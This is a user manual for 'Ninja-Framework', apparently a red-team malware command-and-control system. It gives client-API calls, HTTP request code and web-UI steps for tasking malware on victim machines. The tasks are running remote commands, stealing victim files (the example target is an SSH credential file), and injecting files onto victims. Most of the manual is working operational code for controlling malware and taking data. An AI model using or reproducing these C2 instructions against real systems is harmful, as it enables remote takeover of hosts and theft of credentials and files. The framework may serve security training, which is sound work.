# Ninja-Framework User Manual

This user manual will show the how to use the c2Client API, normal HTTP/HTTPS request and web UI to control the malicious action of the malware and C2 functions.

```
# Created:     2024/05/23
# version:     v0.2.3
# Copyright:   Copyright (c) 2024 LiuYuancheng
# License:     MIT License
```

**Table of Contents**

[TOC]

------

### C2 Function API



#### Function [01] Download file from C2 to local 

**Use C2 client API** : 

```
c2Client.downloadfile(fileName, fileDir=dirpath)
```

- fileName: C2 storage file name.
- fileDir: local file storage directory path.

**Use normal http/https request**

- API URL `http(s)://<ip>:<port>/filedownload`
- Request type: `GET`
- Example: 

```
res = requests.get("http://127.0.0.1:5000/filedownload", json={"filename": 'readme.pdf'}, allow_redirects=True, verify=False) # set allow redirect to by pass load balancer
filePath = os.path.join(dirpath, 'readme.pdf')
if res.ok:
    with open(filePath, 'wb') as fh:
    	fh.write(res.content)
```

**Use Web UI**

- Main page => Malware management page [`http://127.0.0.1:5000/malwaremgmt`] => RTC2 File Storage Management => Download a file from C2 to local. ( as shown below )
- Select the download file from the drop down menu then press the `Download` button. 

![](doc/img/um/um_00.png)



#### Function [02] Upload a local file to C2 server 

**Use C2 client API** : 

```
c2Client.uploadfile(filePath)
```

- filePath: local file path. 

**Use normal http/https request**

- API URL `http(s)://<ip>:<port>/fileupload`
- Request type: `POST`
- Example: 

```
rst = requests.post(http://127.0.0.1:5000/fileupload, files={'file': (fileName, fh.read())}, verify=False)
```

**Use Web UI**

- Main page => Malware management page [`http://127.0.0.1:5000/malwaremgmt`] => RTC2 File Storage Management => Upload a local file to C2 server. ( as shown below )
- Select the `choose file` to select the local file then press the `upload` button. 

![](doc/img/um/um_01.png)



------

### Malware Task API



#### Task [01] Run commands on victim

Description: Run one or multiple commands in the list sequence on the victim and archive the result in the C2 Data base.

**Use C2 client API** : 

```python
malware1id = 'spyTrojan01'
testTaskJson = {
    'taskType'  : c2Constants.TSK_TYPE_CMD,
    'startT'    : None,
    'repeat'    : 1,
    'exePreT'   : 0,
    'state'     : c2Constants.TASK_P_FLG,
    'taskData'  : ['ipconfig']
}
c2Client.postTask(malware1id, testTaskJson)
```

**Use normal http/https request**

- API URL `http(s)://<ip>:<port>/taskPost` 
- Request type: `POST`
- Example: 

```
jsonDict = {
    'id': malware1id, 
    'taskType'  : 'command',
    'startT'    : None,
    'repeat'    : 1,
    'exePreT'   : 0,
    'state'     : 0,
    'taskData'  : ['dir']
}
requests.post("http://%s:%s/taskPost" % (c2IP[0], c2IP[1]), json=jsonDict, allow_redirects=True, verify=False)
```

**Use Web UI**

- Main page => Malware management page [`http://127.0.0.1:5000/malwaremgmt`] => RTC2 File Storage Management => Malware state overview table => Select the malware (link to task detail)
- Malware Task Dashboard => Assign New Task to Malware => select `01. Run commands on victim` => Fill in the command string => Press `submit` button
- When the task state change to "finished", press the "show task result" to check the execution result.

![](doc/img/um/um_03.png)



#### Task [02] Steal file from victim to C2-DB

Description: Search multiple files on victim based on the file path list and upload found files from victim local storage to RTC2's cloud storage data base. 

**Use C2 client API** : 

```python
malware1id = 'spyTrojan01'
testTaskJson = {
    'taskType'  : c2Constants.TSK_TYPE_UPLOAD,
    'startT'    : None,
    'repeat'    : 1,
    'exePreT'   : 0,
    'state'     : c2Constants.TASK_P_FLG,
    'taskData'  : ['C:\\Works\\Download\\sshCredential.txt']
}
c2Client.postTask(malware1id, testTaskJson)
```

**Use normal http/https request**

- API URL `http(s)://<ip>:<port>/taskPost` 
- Request type: `POST`
- Example: 

```
malware1id = 'spyTrojan01'
jsonDict = {
    'id': malware1id, 
    'taskType'  : 'upload',
    'startT'    : None,
    'repeat'    : 1,
    'exePreT'   : 0,
    'state'     : 0,
    'taskData'  : ['dir']
}
requests.post("http://%s:%s/taskPost" % (c2IP[0], c2IP[1]), json=jsonDict, allow_redirects=True, verify=False)
```

**Use Web UI**

- Main page => Malware management page [`http://127.0.0.1:5000/malwaremgmt`] => RTC2 File Storage Management => Malware state overview table => Select the malware (link to task detail)
- Malware Task Dashboard => Assign New Task to Malware => Select `02. Steal file from victim to C2-DB` => Fill in the victim file path => Press `submit` button
- When the task state change to "finished", press the "show task result" to check the execution result or use the management page to download the file.

![](doc/img/um/um_04.png)



#### Task [03] Inject file from C2-DB to victim

Description: Inject a file from RTC2's cloud storage data base in to the victim's local storage. 

**Use C2 client API** : 

```
malware1id = 'spyTrojan01'
testTaskJson = {
    'taskType'  : c2Constants.TSK_TYPE_DOWNLOAD,
    'startT'    : None,
    'repeat'    : 1,
    'exePreT'   : 0,
    'state'     : c2Constants.TASK_P_FLG,
    'taskData'  : ['picctureTestDownload.png']
}
c2Client.postTask(malware1id, testTaskJson)
```

**Use normal http/https request**

- API URL `http(s)://<ip>:<port>/taskPost` 
- Request type: `POST`
- Example: 

```
malware1id = 'spyTrojan01'
jsonDict = {
    'id'        : malware1id, 
    'taskType'  : 'download',
    'startT'    : None,
    'repeat'    : 1,
    'exePreT'   : 0,
    'state'     : 0,
    'taskData'  : ['picctureTestDownload.png']
}
requests.post("http://%s:%s/taskPost" % (c2IP[0], c2IP[1]), json=jsonDict, allow_redirects=True, verify=False)
```

**Use Web UI**

- Main page => Malware management page [`http://127.0.0.1:5000/malwaremgmt`] => RTC2 File Storage Management => Malware state overview table => Select the malware (link to task detail)
- Malware Task Dashboard => Assign New Task to Malware => Select `03. Inject file from C2-DB to victim` => Select the inject file from the drop down menu => Press `inject` button
- When the task state change to "finished", press the `show task result` button to check the execution result. If show file transferred, means the file injection successful. 

![](doc/img/um/um_05.png)